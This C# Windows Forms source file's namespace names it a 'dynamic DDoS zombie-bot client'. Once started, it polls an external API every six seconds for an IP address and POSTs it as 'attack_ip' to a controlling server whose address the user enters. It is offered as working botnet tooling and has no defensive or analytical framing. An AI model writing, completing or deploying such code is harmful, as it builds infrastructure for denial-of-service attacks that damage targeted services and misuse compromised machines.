using System.Net;
using System.Text;

namespace 动态DDOS肉鸡端
{
    public partial class Form1 : Form
    {
        System.Timers.Timer GETIP=new System.Timers.Timer(6000);
        //System.Timers.Timer SETIP = new System.Timers.Timer(6000);
        int a = 0;
        //int b = 0;

        public Form1()
        {
            InitializeComponent();
        }

        [Obsolete]
        private void GETIP_TIME(object sender,System.Timers.ElapsedEventArgs e)
        {
            string server_listen = textBox1.Text.Trim();
            string IPADDRESS;
            string sURL = "https://roshelp.draknightm.ml/api/getip-api.aspx";
            WebRequest wrGETURL;
            wrGETURL = WebRequest.Create(sURL);
            WebProxy myProxy = new WebProxy("myproxy", 80);
            myProxy.BypassProxyOnLocal = true;
            wrGETURL.Proxy = WebProxy.GetDefaultProxy();
            Stream objStream;
            objStream = wrGETURL.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);
            string sLine = objReader.ReadLine();
            IPADDRESS = sLine;

            //POST IPADDRESS
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("" + server_listen + "");
            Encoding utf = Encoding.UTF8;
            string s = string.Concat(new string[]
            {
                        "attack_ip="+IPADDRESS
            }) ;
            byte[] bytes = Encoding.ASCII.GetBytes(s);
            string text3 = string.Empty;
            httpWebRequest.Method = "POST";
            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
            httpWebRequest.ContentLength = (long)bytes.Length;
            using (Stream requestStream = httpWebRequest.GetRequestStream())
            {
                requestStream.Write(bytes, 0, bytes.Length);
                requestStream.Close();
            }
            using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
            {
                using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), utf))
                {
                    text3 = streamReader.ReadToEnd().ToString();
                }
            }

        }

        [Obsolete]
        private void Form1_Load(object sender, EventArgs e)
        {
#pragma warning disable CS8622 // 参数类型中引用类型的为 Null 性与目标委托不匹配(可能是由于为 Null 性特性)。
            GETIP.Elapsed += new
                System.Timers.ElapsedEventHandler(GETIP_TIME);
#pragma warning restore CS8622 // 参数类型中引用类型的为 Null 性与目标委托不匹配(可能是由于为 Null 性特性)。
            GETIP.AutoReset = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(a==0)
            {
                this.button1.Text = "开始";
                GETIP.Enabled = true;
                GETIP.Start();
                a = 1;
            }
            else
            {
                this.button1.Text = "关闭";
                GETIP.Enabled = false;
                GETIP.Stop();
                a = 0;
            }
        }
    }
}